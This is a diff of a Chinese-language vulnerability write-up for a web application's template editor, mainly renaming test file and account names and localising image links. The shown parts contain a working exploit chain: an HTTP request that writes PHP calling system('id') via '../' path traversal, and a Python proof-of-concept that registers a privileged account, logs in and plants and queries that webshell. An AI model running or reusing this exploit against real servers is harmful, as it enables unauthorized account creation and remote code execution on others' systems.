@@ -122,14 +122,14 @@ $ymlData = Spyc::YAMLLoad($_POST['code']);
     $fullpath = $config_templates_basedir+ .$fileName;
 ```
 
-![](http://wikioss.peiqi.tech/vuln/rc-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image/rc-7.png)
 
 ```php
 $filehandle = fopen($fullpath, 'w+');
 file_put_contents($fullpath, $_POST['code']);    
 ```
 
-POST code 传参写入文件 test.php.yml, 请求包如下
+POST code 传参写入文件 pq.php.yml, 请求包如下
 
 ```
 POST /lib/ajaxHandlers/ajaxEditTemplate.php HTTP/1.1
@@ -146,16 +146,16 @@ Content-Type: application/x-www-form-urlencoded
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Referer: https://176.62.195.243/lib/ajaxHandlers/ajaxEditTemplate.php
 
-fileName=../www/test.php&code=<?php echo system('id');?>&id=1
+fileName=../www/pq.php&code=<?php echo system('id');?>&id=1
 ```
 
-![](http://wikioss.peiqi.tech/vuln/rc-8.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image/rc-8.png)
 
 
 
-这里写入文件 **test.php.yml**,并使用 **../** 跳出限制的目录，访问 test.php.yml 实际访问了 test.php，执行id命令
+这里写入文件 **pq.php.yml**,并使用 **../** 跳出限制的目录，访问 pq.php.yml 实际访问了 pq.php，执行id命令
 
-![](http://wikioss.peiqi.tech/vuln/rc-9.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image/rc-9.png)
 
 ## 漏洞POC
 
@@ -191,10 +191,10 @@ def POC_1(target_url):
     origin = target_url
     multipart_data = MultipartEncoder(
         fields={
-            'username': 'testtest{}'.format(ran_number),
-            'password': 'testtest@{}'.format(ran_number),
-            'passconf': 'testtest@{}'.format(ran_number),
-            'email': 'testtest{}@test.com'.format(ran_number),
+            'username': 'pqtest{}'.format(ran_number),
+            'password': 'PQtest@{}'.format(ran_number),
+            'passconf': 'PQtest@{}'.format(ran_number),
+            'email': 'PQtest{}@test.com'.format(ran_number),
             'ulevelid': '9',
             'add': 'add',
             'editid': ''
@@ -207,9 +207,9 @@ def POC_1(target_url):
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False)
         if "error" not in response.text:
-            username = 'testtest{}'.format(ran_number)
-            password = 'testtest@{}'.format(ran_number)
-            print("\033[36m[o] 成功创建账户 testtest{}/testtest@{} \033[0m".format(ran_number, ran_number))
+            username = 'pqtest{}'.format(ran_number)
+            password = 'PQtest@{}'.format(ran_number)
+            print("\033[36m[o] 成功创建账户 pqtest{}/PQtest@{} \033[0m".format(ran_number, ran_number))
             POC_2(target_url, username, password)
         else:
             print("\033[31m[x] 创建失败:{} \033[0m")
@@ -240,11 +240,11 @@ def POC_2(target_url, username, password):
             if "Stephen Stack" in p.text:
                 print("\033[31m[x] 登录失败 \033[0m")
             else:
-                data = "fileName=..%2Fwww%2Ftest.php&code=%3C%3Fphp+echo+system%28%27id%27%29%3B%3F%3E&id=1"
+                data = "fileName=..%2Fwww%2Fpq.php&code=%3C%3Fphp+echo+system%28%27id%27%29%3B%3F%3E&id=1"
                 rce = s.post(target_url + '/lib/ajaxHandlers/ajaxEditTemplate.php', verify=False, data=data,
                              headers=headers)
                 if "success" in rce.text:
-                    response = s.get(target_url + '/test.php.yml', verify=False)
+                    response = s.get(target_url + '/pq.php.yml', verify=False)
                     print("\033[36m[o] 成功执行 id, 响应为:\n{} \033[0m".format(response.text))
                 else:
                     print("\033[31m[x] 请求失败 \033[0m")
@@ -260,4 +260,4 @@ if __name__ == '__main__':
 
 ```
 
-![](http://wikioss.peiqi.tech/vuln/rc-10.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image/rc-10.png)
